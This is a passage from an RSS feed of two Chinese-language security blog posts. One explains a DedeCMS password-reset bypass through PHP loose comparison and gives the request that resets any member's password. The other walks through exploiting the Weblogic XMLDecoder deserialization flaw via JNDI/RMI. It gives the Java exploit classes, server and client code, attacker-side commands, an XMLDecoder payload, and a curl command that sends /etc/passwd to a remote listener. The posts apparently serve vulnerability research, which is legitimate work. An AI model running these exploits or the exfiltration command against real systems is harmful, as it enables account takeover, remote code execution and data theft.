&lt;p&gt;此时默认的&lt;code&gt;$row[&#39;safequestion&#39;]&lt;/code&gt;即为&lt;code&gt;0&lt;/code&gt;，我们可以控制的变量是&lt;code&gt;$safequestion&lt;/code&gt;，在此之前还需经过&lt;code&gt;if(empty($safequestion)) $safequestion = &#39;&#39;;&lt;/code&gt;判断，如果这个if成立即当&lt;code&gt;$safequestion = &#39;&#39;&lt;/code&gt;时就不能通过前半个if判断了，所以我们要让&lt;code&gt;$safequestion&lt;/code&gt;不为空而且让&lt;code&gt;&#39;0&#39; == $safequestion&lt;/code&gt;成立&lt;/p&gt;

&lt;p&gt;下面来看php中弱类型转换问题&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/edFq9&#34; alt=&#34;php&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到当我们传进&lt;code&gt;0.0&lt;/code&gt;时，&lt;code&gt;empty($safequestion)&lt;/code&gt;就不成立了，而&lt;code&gt;$row[&#39;safequestion&#39;] == $safequestion&lt;/code&gt;即&lt;code&gt;&#39;0&#39; == &#39;0.0&#39;&lt;/code&gt;成立，所以可以进入&lt;code&gt;sn&lt;/code&gt;方法。除了&lt;code&gt;&#39;0.0&#39;&lt;/code&gt;，&lt;code&gt;&#39;0.&#39;&lt;/code&gt; &lt;code&gt;&#39;0e123&#39;&lt;/code&gt;等都可以绕过这个判断，因为&lt;code&gt;0en&lt;/code&gt;被认为是0的n次方&lt;/p&gt;

&lt;p&gt;跟进&lt;code&gt;sn&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/xZxqc&#34; alt=&#34;sn&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从数据库取出一个临时密码&lt;code&gt;SELECT * FROM #@__pwd_tmp WHERE mid = &#39;$mid&#39;&lt;/code&gt;，这里的&lt;code&gt;mid&lt;/code&gt;我们可以控制，如果用户存在，发送含有临时密码的邮件，并且有个10分钟的限制(这里为了调试方便我把时间缩短了)&lt;/p&gt;

&lt;p&gt;跟进&lt;code&gt;newmail&lt;/code&gt;函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/0nL4H&#34; alt=&#34;newmail&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到&lt;code&gt;$randval&lt;/code&gt;是一个8位随机字符串，而且先进行了md5再插入到数据库，理论上我们不好破解，但是注意85行和98行的&lt;code&gt;return ShowMsg(&#39;稍后跳转到修改页&#39;, $cfg_basehost . $cfg_memberurl . &amp;quot;/resetpassword.php?dopost=getpasswd&amp;amp;amp;id=&amp;quot; . $mid . &amp;quot;&amp;amp;amp;key=&amp;quot; . $randval);&lt;/code&gt;，把含有&lt;code&gt;$randval&lt;/code&gt;的链接直接返回显示在页面上，所以这里就没有必要去猜这个临时密码。有了这个临时密码就可以重置任意用户的密码。&lt;/p&gt;

&lt;h4 id=&#34;0x04-漏洞利用&#34;&gt;0x04 漏洞利用&lt;/h4&gt;

&lt;p&gt;我们先注册一个用户，然后构造一个请求，&lt;code&gt;GET /dedecms/uploads/member/resetpassword.php?i=0.0&amp;amp;dopost=safequestion&amp;amp;safequestion=0e123&amp;amp;safeanswer=&amp;amp;id=1&lt;/code&gt;，发送后可以看到页面跳转，然后返回含有key的链接，&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/eSNsc&#34; alt=&#34;key&#34; /&gt;
利用这个key可以进入重置密码流程，简单看一下&lt;/p&gt;

&lt;p&gt;重置密码&lt;code&gt;/member/resetpassword.php?dopost=getpasswd&amp;amp;id=5&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oV7zo&#34; alt=&#34;resetpwd1&#34; /&gt;
先从&lt;code&gt;dede_pwd_tmp&lt;/code&gt;表取出&lt;code&gt;mid&lt;/code&gt;为5的临时密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/aIWLU&#34; alt=&#34;resetpwd2&#34; /&gt;
与传入的临时密码MD5比较，通过验证就更新用户表&lt;code&gt;dede_member&lt;/code&gt;为新的密码，同时删除临时密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/J1mks&#34; alt=&#34;resetpwd3&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/EMzcr&#34; alt=&#34;newpwd&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这样我们就可以重置任意用户的密码了——除了管理员，因为管理员信息存在另一个表&lt;code&gt;dede_admin&lt;/code&gt;中，而且管理员默认不允许从前台登录，所以就算更改了&lt;code&gt;dede_member&lt;/code&gt;里&lt;code&gt;admin&lt;/code&gt;的密码也没法登录。&lt;/p&gt;

&lt;h4 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h4&gt;

&lt;p&gt;总的来说这个漏洞不算复杂，关键点就是php弱类型安全问题，这个已经有很多案例了，同时页面跳转的过程中泄露了临时的key，实际中一个尽量避免这种关键的参数泄露。&lt;/p&gt;

&lt;p&gt;参考：&lt;a href=&#34;https://www.seebug.org/vuldb/ssvid-97074&#34;&gt;https://www.seebug.org/vuldb/ssvid-97074&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>Weblogic XMLDecoder RCE之RMI利用</title>
      <link>https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/</link>
      <pubDate>Tue, 09 Jan 2018 10:45:49 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;前阵子披露出的Weblogic XMLDecoder反序列化漏洞影响广泛，不少厂商都中了招，最近又捕获到不少利用这个漏洞进行挖矿的案例，实际上一开始在野外出现的利用就是挖矿程序，那时候漏洞还没被披露= =所以说有些时候黑产都快成为行业的风向标了，安全领域需要与黑灰色产业斗智斗勇，任重道远&amp;hellip;&lt;/p&gt;

&lt;p&gt;这个漏洞的PoC写法灵活变种很多，这次来简单说一下利用java的远程方法调用(Remote Method Invocation, RMI)进行利用的方式&lt;/p&gt;

&lt;h3 id=&#34;0x01-rmi简介&#34;&gt;0x01 RMI简介&lt;/h3&gt;

&lt;p&gt;这里就直接贴一段网上的介绍&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。&lt;/p&gt;

&lt;p&gt;对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于class path中的可序列化类来反序列化。&lt;/p&gt;

&lt;p&gt;RMI的传输100%基于反序列化。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;说实话有点难理解，简单说就是我们可以在远程服务器创建一个对象，然后在本地通过rmi的方式调用这个对象，如果攻击者可以控制某个方法向攻击者的服务器发起rmi请求，从而加载恶意类，就能达到远程攻击的目的。rmi属于JNDI的一种实现方式。&lt;/p&gt;

&lt;h3 id=&#34;0x02-本地调试&#34;&gt;0x02 本地调试&lt;/h3&gt;

&lt;p&gt;这里我使用了@廖新喜的&lt;a href=&#34;http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/&#34;&gt;fastjson 远程反序列化&lt;/a&gt;攻击使用的PoC，里面的JNDI服务可以满足要求&lt;/p&gt;

&lt;p&gt;下载&lt;a href=&#34;https://github.com/shengqi158/fastjson-remote-code-execute-poc&#34;&gt;项目&lt;/a&gt;，在IDEA中打开，我们使用的是JNDI的服务端和客户端部分&lt;/p&gt;

&lt;h4 id=&#34;远程&#34;&gt;远程&lt;/h4&gt;

&lt;p&gt;首先我们在远程服务器上建立一个&lt;code&gt;Exploit&lt;/code&gt;类:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后编译为class:
&lt;code&gt;/usr/lib/jvm/jdk1.7.0_79/bin/javac Exploit.java&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt; 编译&lt;code&gt;Exploit&lt;/code&gt;的java版本需要和接下来要用的本地java版本一致，否则会导致错误&lt;/p&gt;

&lt;p&gt;经过测试jdk1.8版本会有异常产生，需要额外设置&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase = True&lt;/code&gt;，所以这里建议使用jdk1.8以下版本&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/b2MmC&#34; alt=&#34;error&#34; /&gt;&lt;/p&gt;

&lt;p&gt;编译完成之后在VPS开启一个http服务&lt;/p&gt;

&lt;h4 id=&#34;本地&#34;&gt;本地&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;JNDIServer.java&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;package person.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Created by liaoxinxi on 2017-11-6.
 */

public class JNDIServer {
    public static void start() throws AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://xxlegend.com/Exploit.class即可
        //factoryLocation 一定得是ip后带斜杠，这个斜杠少不得，少了的话到web服务器的请求就变成了GET / 而不是正常的GET /Exploit.class
        Reference reference = new Reference(&amp;quot;Exploit&amp;quot;,
                &amp;quot;Exploit&amp;quot;, &amp;quot;http://remote_server:80/&amp;quot;); //此处修改为自己的远程服务器
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind(&amp;quot;Exploit&amp;quot;, referenceWrapper);

    }

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;将&lt;code&gt;factoryLocation&lt;/code&gt;指向远程&lt;code&gt;Exploit&lt;/code&gt;所在的地址，并且要以&lt;code&gt;/&lt;/code&gt;结尾，原因注释里已经说了&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;TestJNDI.java&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;package person;

import javax.naming.*;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;


/**
 * Created by liaoxinxi on 2017-9-5.
 */
public class TestJNDI {
    public static void testRmi() throws NamingException {
        String url = &amp;quot;rmi://127.0.0.1:1099&amp;quot;;
        Hashtable env = new Hashtable();
        env.put(Context.PROVIDER_URL, url);
        env.put(Context.INITIAL_CONTEXT_FACTORY, &amp;quot;com.sun.jndi.rmi.registry.RegistryContextFactory&amp;quot;);
        Context context = new InitialContext(env);
//        Object object1 = context.lookup(&amp;quot;rmi://remote_server:1099/Exploit&amp;quot;);
        Object object = context.lookup(&amp;quot;Exploit&amp;quot;);//ok
//        System.out.println(&amp;quot;Object:&amp;quot; + object);
    }
    public static void main(String[] argv) throws NamingException {
        testRmi();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首先测试本地JNDI服务，先运行&lt;code&gt;JNDIServer&lt;/code&gt;，可以看到在本地监听了1099端口&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/OLArZ&#34; alt=&#34;1099&#34; /&gt;&lt;/p&gt;

&lt;p&gt;然后运行客户端&lt;code&gt;TestJNDI&lt;/code&gt;，可以看到VPS收到了一次请求，访问了&lt;code&gt;Exploit.class&lt;/code&gt;，接着执行了calc:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/e5ntY&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;

&lt;p&gt;测试成功&lt;/p&gt;

&lt;p&gt;整个流程是这样的：&lt;code&gt;lookup&lt;/code&gt;方法向JNDI服务请求&lt;code&gt;Exploit&lt;/code&gt;，JNDI绑定了一个&lt;code&gt;referenceWrapper&lt;/code&gt;，而&lt;code&gt;JNDIReferences&lt;/code&gt;加载了外部对象(远程)，外部对象包含攻击载荷，本地反序列化执行&lt;/p&gt;

&lt;p&gt;那我们可不可以在远程服务器开启一个JNDI服务和http服务，使应用通过&lt;code&gt;rmi://remote_server:1099/Exploit&lt;/code&gt;远程调用呢？&lt;/p&gt;

&lt;h3 id=&#34;0x03-远程利用&#34;&gt;0x03 远程利用&lt;/h3&gt;

&lt;p&gt;我们把项目打成jar包上传到VPS上，然后开启一个JNDI服务和http服务&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;开启JNDI服务&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;/usr/lib/jvm/jdk1.6.0_45/bin/java -jar -Djava.rmi.server.hostname=&amp;quot;192.168.1.2&amp;quot; jnditest.jar
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;
如果此处不指定&lt;code&gt;rmi.server.hostname&lt;/code&gt;的话会出现错误&lt;code&gt;Root exception is java.rmi.ConnectException: Connection refused to host: 127.0.0.1&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;开启http服务&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;python -m SimpleHTTPServer 80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后修改JNDI客户端部分，让它访问rmi远程服务&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Object object = context.lookup(&amp;quot;rmi://remote_server/Exploit&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到执行成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/fcbQR&#34; alt=&#34;calc2&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x04-测试weblogic&#34;&gt;0x04 测试Weblogic&lt;/h3&gt;

&lt;p&gt;下面我们测试一下在实战中能否利用rmi远程代码执行
PoC&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;java version=&amp;quot;1.6.0_45&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
    &amp;lt;void class=&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&amp;gt;
        &amp;lt;void property=&amp;quot;dataSourceName&amp;quot;&amp;gt;
            &amp;lt;string&amp;gt;rmi://remote_server:1099/Exploit&amp;lt;/string&amp;gt;
        &amp;lt;/void&amp;gt;
        &amp;lt;void property=&amp;quot;autoCommit&amp;quot;&amp;gt;
            &amp;lt;boolean&amp;gt;true&amp;lt;/boolean&amp;gt;
        &amp;lt;/void&amp;gt;
    &amp;lt;/void&amp;gt;
&amp;lt;/java&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样的，修改rmi地址为我们自己的服务器。&lt;/p&gt;

&lt;p&gt;由于vulhub搭建的Weblogic环境是基于jdk 1.6.0_45版本的，所以我们还得使用jdk 1.6重新编译项目，服务端同样也是&lt;/p&gt;

&lt;p&gt;再由于目标运行在linux上，无法弹计算器，所以我们还得改Exploit类的命令部分，改成可以回显的或者反弹shell的类，这里仅供参考&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public class Rev {
    public Rev(){
        try{
            Runtime.getRuntime().exec(&amp;quot;curl -F value=@/etc/passwd remote_server:3388&amp;quot;);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Rev e = new Rev();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;VPS上nc监听3388端口，执行成功的话会接收到目标主机的passwd信息&lt;/p&gt;

&lt;p&gt;同样的，先开启JNDI和http服务，还得再监听3388，然后发送PoC&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/fjakh&#34; alt=&#34;rev&#34; /&gt;
成功接收到信息，利用成功。&lt;/p&gt;

&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;

&lt;p&gt;简单总结一下这个利用方式，有几个需要注意的点&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;java版本问题。编译恶意类的java版本，生成jar包的版本，目标运行的java版本需要一致，这在一定程度上限制了通用性&lt;/p&gt;

&lt;p&gt;再一个，java版本不能高于7，因为在jdk1.8中做了限制，需要设置&lt;code&gt;trustURLCodebase&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;需要指定&lt;code&gt;rmi.server.hostname&lt;/code&gt;，在这里坑了好久，一开始以为是ipv6的问题，因为在vps上绑定jndi服务后监听的是tcp6，在github上也有人提了这个问题；后来发现本地执行客户端后与远程主机是建立连接的，却卡在了这个连接上，没有消息通信，说明tcp通道是可以建立的，应该是别的地方有问题。执行后jndi服务器去找了127.0.0.1，一开始以为是本地地址，测试了一番之后发现原来是vps的127.0.0.1，说明已经执行到远程类的部分了，只不过解析地址的时候出现了错误，后来在&lt;a href=&#34;https://stackoverflow.com/questions/15685686/java-rmi-connectexception-connection-refused-to-host-127-0-1-1&#34;&gt;stackoverflow&lt;/a&gt;和&lt;a href=&#34;http://kbase.zohocorp.com/kbase/Web_NMS/Server_Framework/file_112641.html&#34;&gt;这里&lt;/a&gt;找到了答案。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;参考：
&lt;a href=&#34;https://www.one-tab.com/page/rruKb03ATCuYb59FcLA2HQ&#34;&gt;https://www.one-tab.com/page/rruKb03ATCuYb59FcLA2HQ&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
  </channel>
</rss>